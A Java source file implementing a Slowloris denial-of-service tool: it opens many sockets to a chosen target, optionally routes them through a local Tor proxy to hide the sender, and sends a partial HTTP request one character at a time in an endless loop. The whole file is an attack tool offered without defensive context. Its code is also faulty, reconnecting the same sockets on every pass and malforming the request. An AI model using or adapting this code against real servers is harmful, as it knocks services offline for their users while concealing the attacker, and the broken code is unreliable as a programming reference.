package SlowLoris;
 
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
 
public class SlowLoris implements Runnable
{
  private boolean a = false;
  private String b;
  private int c;
  private ArrayList<Socket> d = new ArrayList<Socket>();
  private String toSend;
 
  public SlowLoris(String target, int port, int size, boolean torify)
  {
    this.b = target;
    this.c = port;
   
    Proxy p = !torify ? Proxy.NO_PROXY : new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));
    for (int k = 0; k < size; k++) {
      this.d.add(new Socket(p));
    }
    this.toSend = "GET / HTTP/1.1 Host: " + this.b;
  }
 
  public void run()
  {
    while (!this.a) {
      for(int j = 0; j < toSend.length(); j++) {
    	  for (int i = 0; i < this.d.size(); i++) {
    	        try
    	        {
    	          InetSocketAddress dest = new InetSocketAddress(this.b, this.c);
    	          ((Socket)this.d.get(i)).connect(dest);
    	          PrintWriter pw = new PrintWriter(((Socket)this.d.get(i)).getOutputStream());
    	          pw.println(toSend.charAt(j));
    	          pw.flush();

    	        }
    	        catch (IOException e)
    	        {
    	          e.printStackTrace(System.err);
    	        }
    	      }
      }
      System.out.println("succes");
    }
  }
}